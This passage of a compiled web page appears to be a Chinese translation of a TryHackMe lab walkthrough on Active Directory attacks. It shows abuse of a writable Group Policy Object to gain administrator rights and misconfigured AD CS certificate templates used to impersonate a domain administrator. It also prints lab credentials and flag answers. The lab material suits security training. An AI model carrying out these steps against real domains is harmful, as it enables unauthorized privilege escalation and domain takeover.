\u3002\u5728\u65b0\u6253\u5f00\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u7a97\u53e3\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u542f\u52a8 Microsoft Management Console\uff08MMC\uff09\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\>mmc\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u60f3\u8981\u6dfb\u52a0 Group Policy Management \u63a7\u5236\u53f0\u63d2\u4ef6\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb \u6587\u4ef6 -> \u6dfb\u52a0 / \u79fb\u9664\u63a7\u5236\u53f0"}),"\n",(0,r.jsx)(n.li,{children:"\u9009\u62e9 Group Policy Management \u63a7\u5236\u53f0\u63d2\u4ef6\u5e76\u70b9\u51fb\u6dfb\u52a0"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u786e\u5b9a"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u4f60\u5e94\u8be5\u80fd\u591f\u770b\u5230 za.tryhackme.com \u57df\u7684 GPO\uff08\u7ec4\u7b56\u7565\u5bf9\u8c61\uff09\u4e86\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC za.tryhackme.com domain",src:i(9733).Z+"",width:"808",height:"457"})})}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5bfc\u822a\u81f3\u6211\u4eec\u7684\u7528\u6237\u6709\u6743\u9650\u4fee\u6539\u7684 GPO\uff08\u670d\u52a1\u5668 > \u7ba1\u7406\u670d\u52a1\u5668 > \u7ba1\u7406\u670d\u52a1\u5668\u63a8\u9001\uff09\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC za.tryhackme.com domain GPO",src:i(4264).Z+"",width:"748",height:"470"})})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u70b9\u51fb\u8be5 GPO\uff0c\u7136\u540e\u9009\u62e9\u7f16\u8f91\u3002\u8fd9\u4f1a\u6253\u5f00\u65b0\u7684 Group Policy Management Editor\uff08\u7ec4\u7b56\u7565\u7ba1\u7406\u7f16\u8f91\u5668\uff09\u7a97\u53e3\u3002"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC za.tryhackme.com domain GPO editor",src:i(8291).Z+"",width:"656",height:"225"})})}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u5c06\u6211\u4eec\u7684\u8d26\u6237\u6dfb\u52a0\u5230\u672c\u5730\u7ec4\uff0c\u6211\u4eec\u9700\u8981\u6267\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u5c55\u5f00\u8ba1\u7b97\u673a\u914d\u7f6e"}),"\n",(0,r.jsx)(n.li,{children:"\u5c55\u5f00\u7b56\u7565"}),"\n",(0,r.jsx)(n.li,{children:"\u5c55\u5f00 Windows \u8bbe\u7f6e"}),"\n",(0,r.jsx)(n.li,{children:"\u5c55\u5f00\u5b89\u5168\u8bbe\u7f6e"}),"\n",(0,r.jsx)(n.li,{children:"\u53f3\u952e\u70b9\u51fb\u53d7\u9650\u7ec4\uff0c\u5e76\u9009\u62e9\u6dfb\u52a0\u7ec4\uff08\u5982\u679c IT \u652f\u6301\u7ec4\u5df2\u7ecf\u5b58\u5728\uff0c\u8fd9\u610f\u5473\u7740\u6709\u4eba\u5df2\u7ecf\u6267\u884c\u4e86\u5229\u7528\u3002\u4f60\u53ef\u4ee5\u5220\u9664\u5b83\u4ee5\u4fbf\u91cd\u65b0\u521b\u5efa\uff0c\u6216\u8005\u4ec5\u68c0\u67e5\u5b83\u4ee5\u67e5\u770b\u914d\u7f6e\u60c5\u51b5\u3002\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u6d4f\u89c8\uff0c\u8f93\u5165 IT Support \u5e76\u70b9\u51fb\u68c0\u67e5\u540d\u79f0"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e24\u6b21\u786e\u5b9a"}),"\n"]}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC za.tryhackme.com domain IT Support Properties",src:i(1900).Z+"",width:"355",height:"451"})})}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e00\u4e2a\u7b5b\u9009\u5668\u672a\u88ab\u4f7f\u7528\u3002\u5bf9\u4e8e\u7b2c\u4e8c\u4e2a\u7b5b\u9009\u5668\uff0c\u6211\u4eec\u60f3\u8981\u6dfb\u52a0\u7ba1\u7406\u5458\u7ec4\u548c\u8fdc\u7a0b\u684c\u9762\u7528\u6237\u7ec4\u3002\u6700\u7ec8\uff0c\u5b83\u5e94\u8be5\u7c7b\u4f3c\u4e8e\u8fd9\u6837\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC za.tryhackme.com domain IT Support Properties Groups",src:i(4889).Z+"",width:"354",height:"449"})})}),"\n",(0,r.jsx)(n.p,{children:"\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u70b9\u51fb\u5e94\u7528\u5e76\u786e\u5b9a\u3002\u73b0\u5728\uff0c\u6211\u4eec\u6240\u9700\u505a\u7684\u5c31\u662f\u7b49\u5f85\u6700\u591a 15 \u5206\u949f\u8ba9 GPO \u751f\u6548\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u6700\u521d\u6dfb\u52a0\u5230 IT \u652f\u6301\u7ec4\u7684\u8d26\u6237\u5c06\u5728 THMSERVER2 \u4e0a\u62e5\u6709\u7ba1\u7406\u5458\u548c\u8fdc\u7a0b\u684c\u9762\u6743\u9650\uff01"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u4ec0\u4e48\u5bf9\u8c61\u5141\u8bb8\u7528\u6237\u914d\u7f6e Windows \u7b56\u7565\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Group Policy Objects\n"})}),(0,r.jsx)(n.p,{children:"\u54ea\u4e9b AD \u529f\u80fd\u5141\u8bb8\u6211\u4eec\u4e3a\u6574\u4e2a AD \u7ed3\u6784\u914d\u7f6e GPO\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Group Policy Management\n"})}),(0,r.jsx)(n.p,{children:"\u6211\u4eec\u88ab\u5165\u4fb5\u7684 AD \u8d26\u6237\u62e5\u6709\u7684 GPO \u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Management Server Pushes\n"})}),(0,r.jsx)(n.p,{children:"\u7ba1\u7406\u5458\u684c\u9762\u76ee\u5f55 (flag4.txt) \u4e2d THMSERVER2 \u4e0a\u5b58\u50a8\u7684\u6807\u5fd7\u7684\u503c\u662f\u591a\u5c11\uff1f"}),(0,r.jsxs)(t,{children:[(0,r.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u8fd9\u91cc\u8981\u4f7f\u7528\u5230\u4e0a\u6587\u5728\u5bc6\u7801\u6570\u636e\u5e93\u4e2d\u53d1\u73b0\u7684\u51ed\u636e"}),(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"keepassx \u654f\u611f\u8d26\u6237",src:i(441).Z+"",width:"1003",height:"652"})})}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Username: svcServMan\nPassword: Sup3rStr0ngPass!@\n"})}),(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u5148\u4ee5\u666e\u901a\u8d26\u53f7\u767b\u5f55\u5230 THMWRK1"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Your credentials have been generated: Username: william.white Password: ntIMDXayg7U\n"})}),(0,r.jsxs)(n.p,{children:["\u7136\u540e runas \u5207\u6362\u5230 ",(0,r.jsx)(n.code,{children:"t2_melanie.davies"})," \u8d26\u6237\uff0c\u7136\u540e\u542f\u52a8 MMC"]}),(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"RDP runas MMC",src:i(5336).Z+"",width:"1320",height:"787"})})}),(0,r.jsx)(n.p,{children:"\u4fee\u6539\u76f8\u5173\u6743\u9650"}),(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6dfb\u52a0\u5bf9\u5e94\u7684\u7528\u6237\u7ec4",src:i(7145).Z+"",width:"1320",height:"787"})})}),(0,r.jsxs)(n.p,{children:["\u7136\u540e\u63a5\u4e0b\u6765\u4f7f\u7528\u6211\u4eec\u5f53\u521d\u6dfb\u52a0\u5230 ",(0,r.jsx)(n.code,{children:"IT Support"})," \u7528\u6237\u7ec4\u7684\u8d26\u6237\uff1a"]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Username: christopher.smith\nPassword: Mznl7973\n"})}),(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u8fd9\u4e2a\u8d26\u6237\u767b\u5f55\u5230 THMSERVER2"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ssh za.tryhackme.loc\\\\christopher.smith@thmserver2.za.tryhackme.loc\n......\nza\\christopher.smith@THMSERVER2 C:\\Users\\Administrator\\Desktop>type flag4.txt\nTHM{Exploiting.GPOs.For.Fun.And.Profit}\n"})})]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{Exploiting.GPOs.For.Fun.And.Profit}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-certificates---\u5229\u7528\u8bc1\u4e66",children:"Exploiting Certificates - \u5229\u7528\u8bc1\u4e66"}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u8bbf\u95ee THMSERVER2\uff0c\u6211\u4eec\u901a\u8fc7\u5229\u7528\u6240\u6709 Tier 1 \u8d44\u4ea7\uff08\u670d\u52a1\u5668\uff09\u6765\u8fdb\u4e00\u6b65\u5229\u7528 AD\u3002\u7136\u800c\uff0c\u6211\u4eec\u518d\u6b21\u9047\u5230\u4e86\u65e0\u6cd5\u7b80\u5355\u5730\u8fdb\u5165\u4e0b\u4e00\u5c42\u7684\u96be\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u66f4\u5177\u521b\u9020\u6027\u7684\u8def\u5f84\u3002"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://posts.specterops.io/certified-pre-owned-d95910965cd2",children:"SpecterOps \u53d1\u5e03\u7684\u7814\u7a76\u767d\u76ae\u4e66"})," \u663e\u793a\uff0c\u53ef\u4ee5\u5229\u7528\u914d\u7f6e\u9519\u8bef\u7684\u8bc1\u4e66\u6a21\u677f\u8fdb\u884c\u6743\u9650\u63d0\u5347\u548c\u6a2a\u5411\u79fb\u52a8\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"ad-\u8bc1\u4e66\u670d\u52a1",children:"AD \u8bc1\u4e66\u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"AD \u8bc1\u4e66\u670d\u52a1\uff08CS\uff09\u662f\u5fae\u8f6f\u7684\u516c\u94a5\u57fa\u7840\u8bbe\u65bd\uff08PKI\uff09\u5b9e\u73b0\u3002\u7531\u4e8e AD \u5728\u7ec4\u7ec7\u4e2d\u63d0\u4f9b\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4fe1\u4efb\uff0c\u5b83\u53ef\u4ee5\u4f5c\u4e3a CA \u6765\u8bc1\u660e\u548c\u59d4\u6d3e\u4fe1\u4efb\u3002AD CS \u7528\u4e8e\u8bf8\u5982\u52a0\u5bc6\u6587\u4ef6\u7cfb\u7edf\u3001\u521b\u5efa\u548c\u9a8c\u8bc1\u6570\u5b57\u7b7e\u540d\uff0c\u751a\u81f3\u7528\u6237\u8ba4\u8bc1\u7b49\u591a\u79cd\u7528\u9014\uff0c\u4f7f\u5176\u6210\u4e3a\u653b\u51fb\u8005\u7684\u4e00\u4e2a\u6709\u524d\u666f\u7684\u9014\u5f84\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e AD CS \u662f\u4e00\u4e2a\u7279\u6743\u529f\u80fd\uff0c\u901a\u5e38\u5728\u9009\u5b9a\u7684\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u3002\u8fd9\u610f\u5473\u7740\u666e\u901a\u7528\u6237\u5b9e\u9645\u4e0a\u65e0\u6cd5\u76f4\u63a5\u4e0e\u8be5\u670d\u52a1\u4ea4\u4e92\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u7ec4\u7ec7\u5f80\u5f80\u8fc7\u5927\uff0c\u65e0\u6cd5\u8ba9\u7ba1\u7406\u5458\u624b\u52a8\u521b\u5efa\u548c\u5206\u53d1\u6bcf\u4e2a\u8bc1\u4e66\u3002\u8fd9\u5c31\u662f\u8bc1\u4e66\u6a21\u677f\u53d1\u6325\u4f5c\u7528\u7684\u5730\u65b9\u3002AD CS \u7684\u7ba1\u7406\u5458\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u6a21\u677f\uff0c\u5141\u8bb8\u5177\u6709\u76f8\u5173\u6743\u9650\u7684\u4efb\u4f55\u7528\u6237\u81ea\u884c\u8bf7\u6c42\u8bc1\u4e66\u3002\u8fd9\u4e9b\u6a21\u677f\u5177\u6709\u53c2\u6570\uff0c\u8bf4\u660e\u4e86\u54ea\u4e2a\u7528\u6237\u53ef\u4ee5\u8bf7\u6c42\u8bc1\u4e66\u4ee5\u53ca\u9700\u8981\u4ec0\u4e48\u6761\u4ef6\u3002SpecterOps \u53d1\u73b0\uff0c\u7279\u5b9a\u7ec4\u5408\u7684\u8fd9\u4e9b\u53c2\u6570\u53ef\u80fd\u975e\u5e38\u6709\u6bd2\uff0c\u5e76\u53ef\u7528\u4e8e\u7279\u6743\u5347\u7ea7\u548c\u6301\u4e45\u8bbf\u95ee\u7684\u6ee5\u7528\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u6df1\u5165\u63a2\u8ba8\u8bc1\u4e66\u6ee5\u7528\u4e4b\u524d\uff0c\u5148\u4e86\u89e3\u4e00\u4e9b\u672f\u8bed\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"PKI\uff08\u516c\u94a5\u57fa\u7840\u8bbe\u65bd\uff09- \u7ba1\u7406\u8bc1\u4e66\u548c\u516c\u94a5\u52a0\u5bc6\u7684\u7cfb\u7edf"}),"\n",(0,r.jsx)(n.li,{children:"AD CS\uff08Active Directory \u8bc1\u4e66\u670d\u52a1\uff09- \u5fae\u8f6f\u7684 PKI \u5b9e\u73b0\uff0c\u901a\u5e38\u8fd0\u884c\u5728\u57df\u63a7\u5236\u5668\u4e0a"}),"\n",(0,r.jsx)(n.li,{children:"CA\uff08\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff09- \u9881\u53d1\u8bc1\u4e66\u7684 PKI"}),"\n",(0,r.jsx)(n.li,{children:"Certificate Template \uff08\u8bc1\u4e66\u6a21\u677f\uff09 - \u4e00\u7ec4\u8bbe\u7f6e\u548c\u7b56\u7565\uff0c\u5b9a\u4e49\u4e86\u8bc1\u4e66\u4f55\u65f6\u4ee5\u53ca\u5982\u4f55\u53ef\u4ee5\u7531 CA \u9881\u53d1"}),"\n",(0,r.jsx)(n.li,{children:"CSR\uff08\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\uff09- \u53d1\u9001\u7ed9 CA \u4ee5\u8bf7\u6c42\u7b7e\u540d\u8bc1\u4e66\u7684\u6d88\u606f"}),"\n",(0,r.jsx)(n.li,{children:"EKU\uff08\u6269\u5c55 / \u589e\u5f3a\u5bc6\u94a5\u7528\u6cd5\uff09- \u5b9a\u4e49\u751f\u6210\u8bc1\u4e66\u53ef\u4ee5\u5982\u4f55\u4f7f\u7528\u7684\u5bf9\u8c61\u6807\u8bc6\u7b26"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u67e5\u627e\u6613\u53d7\u653b\u51fb\u7684\u8bc1\u4e66\u6a21\u677f",children:"\u67e5\u627e\u6613\u53d7\u653b\u51fb\u7684\u8bc1\u4e66\u6a21\u677f"}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u627e\u5230\u5b58\u5728\u6f0f\u6d1e\u7684\u6a21\u677f\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 Windows \u5185\u7f6e\u5de5\u5177 certutil\u3002\u5229\u7528\u6211\u4eec\u5728 THMSERVER2 \u4e0a\u7684 RDP \u8bbf\u95ee\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u4ee5\u4e0b Powershell \u811a\u672c\u6765\u5217\u4e3e\u8bc1\u4e66\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",metastring:'title="Powershell"',children:"C:\\>certutil -Template -v > templates.txt\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u5c06\u63d0\u4f9b\u6240\u6709\u914d\u7f6e\u6a21\u677f\u7684\u8f93\u51fa\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982 Ghostpack \u7684 ",(0,r.jsx)(n.a,{href:"https://github.com/GhostPack/PSPKIAudit",children:"PSPKIAudit"})," \u4e4b\u7c7b\u7684\u8bc1\u4e66\u5ba1\u8ba1\u5de5\u5177\u3002\u4f46\u662f\uff0c\u624b\u52a8\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u6211\u4eec\u627e\u5230\u6240\u6709\u53ef\u80fd\u7684\u9519\u8bef\u914d\u7f6e\u3002\u5982\u679c\u4e00\u7ec4\u53c2\u6570\u503c\u7684\u7ec4\u5408\u53d8\u5f97\u6709\u5bb3\uff0c\u5141\u8bb8\u8bf7\u6c42\u8005\u6267\u884c\u7279\u6743\u5347\u7ea7\uff0c\u90a3\u4e48\u8bc1\u4e66\u6a21\u677f\u88ab\u89c6\u4e3a\u914d\u7f6e\u9519\u8bef\u3002\u5728\u6211\u4eec\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6b63\u5728\u5bfb\u627e\u5177\u6709\u4ee5\u4e0b\u6709\u5bb3\u53c2\u6570\u7ec4\u5408\u7684\u6a21\u677f\uff1a"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u5ba2\u6237\u7aef\u8ba4\u8bc1 - \u8bc1\u4e66\u53ef\u7528\u4e8e\u5ba2\u6237\u7aef\u8ba4\u8bc1\u3002"}),"\n",(0,r.jsx)(n.li,{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - \u8bc1\u4e66\u6a21\u677f\u5141\u8bb8\u6211\u4eec\u6307\u5b9a\u4e3b\u4f53\u5907\u7528\u540d\u79f0\uff08SAN\uff09\u3002"}),"\n",(0,r.jsx)(n.li,{children:"CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - \u8bc1\u4e66\u5c06\u53ef\u4ee5\u5bfc\u51fa\u5305\u542b\u79c1\u94a5\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u8bc1\u4e66\u6743\u9650 - \u6211\u4eec\u5177\u6709\u4f7f\u7528\u8bc1\u4e66\u6a21\u677f\u6240\u9700\u7684\u6743\u9650\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u4f60\u5bf9\u4e86\u89e3\u6709\u5bb3\u53c2\u6570\u7ec4\u5408\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u9605\u8bfb SpecterOps \u7684\u767d\u76ae\u4e66\u3002\u7531\u4e8e\u672c\u6b21\u6f14\u7ec3\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u66f4\u5e7f\u6cdb\u5730\u4e86\u89e3 AD \u653b\u51fb\uff0c\u6211\u4eec\u5c06\u6307\u51fa Template[32] \u662f\u5b58\u5728\u6f0f\u6d1e\u7684\u6a21\u677f\u3002\u5728\u8fd9\u4e2a\u6a21\u677f\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 THMSERVER2 \u7684\u673a\u5668\u5e10\u6237\u53ef\u4ee5\u4e3a\u5141\u8bb8\u6211\u4eec\u6307\u5b9a\u4e3b\u4f53\u5907\u7528\u540d\u79f0\uff08SAN\uff09\u5e76\u53ef\u7528\u4e8e\u5ba2\u6237\u7aef\u8ba4\u8bc1\u7684\u6a21\u677f\u53d1\u5e03 CSR\u3002"}),"\n",(0,r.jsx)(n.p,{children:"SpecterOps \u63d0\u5230\u4e86\u4e0e AD CS \u76f8\u5173\u7684\u516b\u4e2a\u5e38\u89c1\u5b89\u5168\u9519\u8bef\u914d\u7f6e\uff0c\u56e0\u6b64\u9700\u8981\u6ce8\u610f\uff0c\u4ecd\u7136\u6709\u5927\u91cf\u53ef\u80fd\u53d1\u73b0\u7684\u9519\u8bef\u914d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528\u8bc1\u4e66\u6a21\u677f",children:"\u5229\u7528\u8bc1\u4e66\u6a21\u677f"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u5728 THMSERVER2 \u4e0a\u7684 RDP \u8bbf\u95ee\u6743\u9650\uff0c\u6211\u4eec\u73b0\u5728\u5c06\u8bf7\u6c42\u6211\u4eec\u7684\u8bc1\u4e66\u3002\u5982\u679c\u4f60\u4f7f\u7528 Remmina \u5e76\u4fdd\u5b58\u4e86 RDP \u8fde\u63a5\u7684\u914d\u7f6e\uff0c\u8bf7\u786e\u4fdd\u7981\u7528\u4e86\u53d7\u9650\u7ba1\u7406\u5458\u6a21\u5f0f\u3002\u6211\u4eec\u5c06\u4f7f\u7528 Microsoft Management Console\uff08MMC\uff09\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u5f00\u59cb -> \u8fd0\u884c"}),"\n",(0,r.jsx)(n.li,{children:"\u8f93\u5165 mmc \u5e76\u6309\u56de\u8f66"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u6587\u4ef6 -> \u6dfb\u52a0 / \u79fb\u9664\u63d2\u4ef6.."}),"\n",(0,r.jsx)(n.li,{children:"\u6dfb\u52a0\u8bc1\u4e66\u63d2\u4ef6\uff0c\u5e76\u786e\u4fdd\u5728\u63d0\u793a\u4e2d\u9009\u62e9\u8ba1\u7b97\u673a\u5e10\u6237\u548c\u672c\u5730\u8ba1\u7b97\u673a\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u786e\u5b9a"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u4f60\u5e94\u8be5\u770b\u5230\u4e86\u8bc1\u4e66\u63d2\u4ef6\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC \u8bc1\u4e66",src:i(9979).Z+"",width:"500",height:"454"})})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u5c06\u8bf7\u6c42\u4e00\u4e2a\u4e2a\u4eba\u8bc1\u4e66\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u53f3\u952e\u70b9\u51fb \u201c\u4e2a\u4eba\u201d\uff0c\u9009\u62e9 \u201c\u6240\u6709\u4efb\u52a1 -> \u8bf7\u6c42\u65b0\u8bc1\u4e66\u2026\u201d"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e24\u6b21 \u201c\u4e0b\u4e00\u6b65\u201d \u4ee5\u9009\u62e9 AD \u6ce8\u518c\u7b56\u7565\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u4f60\u4f1a\u770b\u5230\u6211\u4eec\u53ef\u4ee5\u8bf7\u6c42\u4e00\u4e2a\u6a21\u677f\uff0c\u4f46\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u63d0\u4f9b\u989d\u5916\u7684\u4fe1\u606f\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb \u201c\u66f4\u591a\u4fe1\u606f\u201d \u8b66\u544a\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5c06 \u201c\u4e3b\u4f53\u540d\u79f0\u7c7b\u578b\u201d \u9009\u9879\u66f4\u6539\u4e3a \u201c\u901a\u7528\u540d\u79f0\u201d\uff0c\u63d0\u4f9b\u4efb\u4f55\u503c\uff0c\u56e0\u4e3a\u8fd9\u5e76\u4e0d\u91cd\u8981\uff0c\u7136\u540e\u70b9\u51fb \u201c\u6dfb\u52a0\u201d\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5c06 \u201c\u5907\u7528\u540d\u79f0\u7c7b\u578b\u201d \u9009\u9879\u66f4\u6539\u4e3a \u201c\u7528\u6237\u4e3b\u4f53\u540d\u79f0\uff08UPN\uff09\u201d\u3002"}),"\n",(0,r.jsxs)(n.li,{children:["\u63d0\u4f9b\u4f60\u60f3\u8981\u6a21\u4eff\u7684\u7528\u6237\u7684 UPN\u3002\u6700\u597d\u9009\u62e9\u4e00\u4e2a DA\uff08\u57df\u7ba1\u7406\u5458\uff09\u8d26\u6237\uff0c\u6bd4\u5982 ",(0,r.jsx)(n.code,{children:"Administrator@za.tryhackme.loc"})," \uff0c\u7136\u540e\u70b9\u51fb \u201c\u6dfb\u52a0\u201d\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4f60\u7684\u8bc1\u4e66\u4fe1\u606f\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC \u8bc1\u4e66 \u7533\u8bf7\u4e2a\u4eba\u8bc1\u4e66",src:i(5974).Z+"",width:"494",height:"503"})})}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u65e6\u786e\u8ba4\u65e0\u8bef\uff0c\u70b9\u51fb\u5e94\u7528\u548c\u786e\u5b9a\u3002\u7136\u540e\uff0c\u9009\u62e9\u8bc1\u4e66\u5e76\u70b9\u51fb \u201c\u6ce8\u518c\u201d\u3002\u4f60\u5e94\u8be5\u80fd\u591f\u770b\u5230\u4f60\u7684\u8bc1\u4e66\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"MMC \u8bc1\u4e66 \u7533\u8bf7\u4e2a\u4eba\u8bc1\u4e66 \u6210\u529f",src:i(409).Z+"",width:"726",height:"160"})})}),"\n",(0,r.jsx)(n.p,{children:"\u6700\u540e\u4e00\u6b65\u662f\u5bfc\u51fa\u5e26\u6709\u79c1\u94a5\u7684\u8bc1\u4e66\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u53f3\u952e\u70b9\u51fb\u8bc1\u4e66\uff0c\u9009\u62e9 \u201c\u6240\u6709\u4efb\u52a1 -> \u5bfc\u51fa\u2026\u201d"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u9009\u62e9\u662f\uff0c\u5bfc\u51fa\u79c1\u94a5\uff0c\u7136\u540e\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u7136\u540e\u4e3a\u8bc1\u4e66\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\uff0c\u56e0\u4e3a\u6ca1\u6709\u5bc6\u7801\u65e0\u6cd5\u5bfc\u51fa\u79c1\u94a5\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u9009\u62e9\u5b58\u50a8\u8bc1\u4e66\u7684\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u6700\u540e\u70b9\u51fb\u5b8c\u6210\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u901a\u8fc7\u8bc1\u4e66\u6a21\u62df\u7528\u6237",children:"\u901a\u8fc7\u8bc1\u4e66\u6a21\u62df\u7528\u6237"}),"\n",(0,r.jsx)(n.p,{children:"\u7